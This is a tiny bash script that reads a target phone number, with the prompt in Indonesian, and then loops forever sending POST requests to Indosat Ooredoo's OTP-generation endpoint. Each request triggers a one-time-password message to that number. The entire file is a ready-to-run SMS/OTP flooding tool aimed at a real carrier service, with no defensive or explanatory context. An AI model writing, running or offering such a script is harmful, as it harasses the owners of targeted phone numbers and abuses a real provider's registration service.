#!/bin/bash
read -p 'Nomer Target[Example 0896xxxxx]: ' nmr
while :;do curl -X POST -d "msisdn=$nmr" https://myim3.indosatooredoo.com/registration/generateOTP;done
